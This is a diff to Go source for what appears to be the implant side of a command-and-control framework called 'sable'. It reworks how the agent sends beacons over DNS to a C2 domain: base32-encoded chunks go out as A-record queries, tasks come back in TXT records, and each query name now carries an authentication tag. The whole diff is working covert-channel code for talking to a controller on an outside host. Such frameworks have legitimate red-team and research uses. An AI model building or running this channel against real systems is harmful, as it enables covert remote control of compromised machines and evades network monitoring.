@@ -11,6 +11,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/aelder202/sable/internal/protocol"
 	mdns "github.com/miekg/dns"
 )
 
@@ -26,7 +27,7 @@ var errDNSBeaconTooLarge = errors.New("encoded beacon exceeds DNS transport limi
 // sendBeaconDNS transmits an encoded beacon over DNS and returns the server's encrypted response.
 // Each chunk is base32-encoded and sent as a DNS A-record query.
 // The server responds with the task in a TXT record on the final chunk.
-func sendBeaconDNS(encoded []byte, c2Domain string) ([]byte, error) {
+func sendBeaconDNS(encoded []byte, c2Domain, agentID string, secret []byte) ([]byte, error) {
 	if len(encoded) > maxDNSBeaconBytes {
 		return nil, fmt.Errorf("%w (%d > %d bytes)", errDNSBeaconTooLarge, len(encoded), maxDNSBeaconBytes)
 	}
@@ -51,8 +52,9 @@ func sendBeaconDNS(encoded []byte, c2Domain string) ([]byte, error) {
 		b32 := strings.ToLower(
 			base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(chunk),
 		)
-		// Query format: <base32chunk>.<index>.<total>.<sessionID>.<agentID>.<domain>.
-		qname := fmt.Sprintf("%s.%04d.%04d.%s.%s.%s.", b32, i, total, sessionID, AgentID, domain)
+		// Query format: <base32chunk>.<index>.<total>.<sessionID>.<agentID>.<authTag>.<domain>.
+		authTag := protocol.DNSChunkAuthTag(secret, sessionID, agentID, i, total, chunk)
+		qname := fmt.Sprintf("%s.%04d.%04d.%s.%s.%s.%s.", b32, i, total, sessionID, agentID, authTag, domain)
 
 		msg := new(mdns.Msg)
 		msg.SetQuestion(qname, mdns.TypeA)
@@ -74,7 +76,7 @@ func sendBeaconDNS(encoded []byte, c2Domain string) ([]byte, error) {
 	if err != nil {
 		// The completed beacon response may have been lost. The server retains
 		// response chunks briefly, so retry chunk zero without replaying it.
-		first, totalResponses, err = retrieveDNSResponseChunk(client, serverAddr, domain, sessionID, AgentID, 0)
+		first, totalResponses, err = retrieveDNSResponseChunk(client, serverAddr, domain, sessionID, agentID, secret, 0)
 		if err != nil {
 			return nil, err
 		}
@@ -84,7 +86,7 @@ func sendBeaconDNS(encoded []byte, c2Domain string) ([]byte, error) {
 	}
 	respBytes := append([]byte(nil), first...)
 	for index := 1; index < totalResponses; index++ {
-		chunk, chunkTotal, err := retrieveDNSResponseChunk(client, serverAddr, domain, sessionID, AgentID, index)
+		chunk, chunkTotal, err := retrieveDNSResponseChunk(client, serverAddr, domain, sessionID, agentID, secret, index)
 		if err != nil {
 			return nil, err
 		}
@@ -96,8 +98,9 @@ func sendBeaconDNS(encoded []byte, c2Domain string) ([]byte, error) {
 	return respBytes, nil
 }
 
-func retrieveDNSResponseChunk(client *mdns.Client, serverAddr, domain, sessionID, agentID string, index int) ([]byte, int, error) {
-	qname := fmt.Sprintf("r.%04d.%s.%s.%s.", index, sessionID, agentID, domain)
+func retrieveDNSResponseChunk(client *mdns.Client, serverAddr, domain, sessionID, agentID string, secret []byte, index int) ([]byte, int, error) {
+	authTag := protocol.DNSResponseAuthTag(secret, sessionID, agentID, index)
+	qname := fmt.Sprintf("r.%04d.%s.%s.%s.%s.", index, sessionID, agentID, authTag, domain)
 	msg := new(mdns.Msg)
 	msg.SetQuestion(qname, mdns.TypeTXT)
 	msg.SetEdns0(agentDNSUDPSize, false)
